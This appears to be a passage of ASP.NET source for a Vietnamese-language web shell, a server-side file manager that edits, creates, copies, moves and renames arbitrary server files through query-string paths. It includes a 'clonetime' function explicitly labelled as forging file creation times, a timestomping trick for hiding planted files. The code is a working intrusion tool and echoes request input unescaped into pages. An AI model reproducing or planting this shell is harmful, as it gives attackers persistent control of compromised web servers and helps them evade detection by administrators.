				response.Write("<script>alert('Cut  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP1 & "\","\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
			else
				call xexistdir(TEMP2,ow)
				file.move(replace(d,"",""),TEMP2)
				response.Write("<script>alert('Cut  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP2,"\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
			end if
		else
			TEMP1=url & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
			TEMP2=url & path.getfilename(replace(d,"",""))
			if right(d,1)="\" then 
				call xexistdir(TEMP1,ow)
				directory.createdirectory(TEMP1)
				call copydir(replace(d,"",""),TEMP1 & "\")
				response.Write("<script>alert('Copy  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP1 & "\","\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
			else
				call xexistdir(TEMP2,ow)
				file.copy(replace(d,"",""),TEMP2)
				response.Write("<script>alert('Copy  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP2,"\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
			end if
		end if
	case "upfile"
		url=request.QueryString("src") 
		
%>

<%
	case "new"
		url=request.QueryString("src")
%>
<form class="boxx" runat="server">
  <Span>Tạo tập tin hoặc thư mục tại vị trí <%=url%></Span><br><center>
  Tên :
  <asp:TextBox ID="NewName" TextMode="SingleLine" runat="server" class="TextBox" width="50%"/>
  <br>
  <asp:RadioButton ID="NewFile" Text="Tập Tin" runat="server" GroupName="New" Checked="true"/>
  <asp:RadioButton ID="NewDirectory" Text="Thư Mục" runat="server"  GroupName="New"/> 
  <br>
  </center>
  <asp:Button ID="NewButton" Text="Ok rồi đấy =))" runat="server" CssClass="buttom"  OnClick="NewFD"/>  
  <input name="Src" type="hidden" value="<%=url%>">
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">Trở Lại</a>
<%
	case "edit"
		dim b as string
		b=request.QueryString("src")
		call existdir(b)
		dim myread as new streamreader(b,encoding.default)
		filepath.text=b
		content.text=myread.readtoend
%>
<form class="boxx" runat="server">
  <table width="100%"  border="1" align="center">
    <tr>      <td width="11%">Vị trí</td>
      <td width="89%">
      <asp:TextBox CssClass="TextBox" ID="filepath" runat="server" Width="500"/>
      *</td>
    </tr>
    <tr>
      <td>Nội Dung</td> 
      <td> <asp:TextBox ID="content" Rows="25" Columns="100" TextMode="MultiLine" runat="server" CssClass="TextBox"/></td>
    </tr>
    <tr>
      <td></td>
      <td> <asp:Button ID="a" Text="Sumbit" runat="server" OnClick="Editor" CssClass="buttom"/>         
      </td>
    </tr>
  </table>
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">Trở Lại</a>
<%
  		myread.close
	case "rename"
		url=request.QueryString("src")
		if request.Form("name")="" then
	%>
<form class="boxx" name="formRn" method="post" action="?action=rename&src=<%=server.UrlEncode(request.QueryString("src"))%>" onSubmit="return checkname();">
  <p>Bạn sẽ đổi tên từ <span class="style3"><%=request.QueryString("src")%></span> Thành: <%=getparentdir(request.QueryString("src"))%>
    <input type="text" name="name" class="TextBox" Width="50%">
    <input type="submit" name="Submit3" value="Đổi Tên" class="buttom">
</p>
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">Trở Lại</a>
<script language="javascript">
function checkname()
{
if(formRn.name.value==""){alert("You shall input filename :(");return false}
}
</script>
  <%
		else
			if Rename() then
				response.Write("<script>alert('Đổi tên " & replace(url,"\","\\") & " thành " & replace(Getparentdir(url) & request.Form("name"),"\","\\") & " Success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(url)) &"'</script>")
			else
				response.Write("<script>alert('Tên này đã có rồi, Thử chọn tên khác xem :(');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(url)) &"'</script>")
			end if
		end if
	case "samename"
		url=request.QueryString("src")
%>
<form name="form1" method="post" action="?action=paste&src=<%=server.UrlEncode(url)%>">
<p class="style3">Exist the same name file , can you overwrite ?(If you click &quot; no&quot; , it will auto add a number as prefix)</p>
  <input name="OverWrite" type="submit" id="OverWrite" value="Yes" class="buttom">
<input name="Cancel" type="submit" id="Cancel" value="No" class="buttom">
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">Trở Lại</a>
   <%
    case "clonetime"
		time1.Text=request.QueryString("src")&"keyword.aspx"
		time2.Text=request.QueryString("src")
	%>
<form class = "boxx" runat="server">
  <p>[Sao chép thời gian tạo file ]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:history.back(1);">Quay lại trang chính</a></i> </p>
  <p>Giả mạo thời gian tạo File </p>
  <p>File muốn đổi thời gian:
    <asp:TextBox CssClass="TextBox" ID="time1" runat="server" Width="70%"/></p>
  <p>File có thời gian cần đổi:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    <asp:TextBox CssClass="TextBox" ID="time2" runat="server" Width="70%"/></p>
<asp:Button ID="ButtonClone" Text="Ok rồi đấy =))" runat="server" CssClass="buttom" OnClick="CloneTime"/>
</form>
<p>
  <%
	case "logout"
   		session.Abandon()
		response.Write("<script>alert('T&#7841;m bi&#7879;t ^^ !');location.href='" & request.ServerVariables("URL") & "';</sc" & "ript>")
	end select
end if
Catch error_x
	response.Write("<font color=""red""><br>Wrong: </font>"&error_x.Message)
End Try
%>
</p>
</p>
<hr>
<script language="javascript">
function closewindow()
{self.close();}
</script>
</body>
</html>
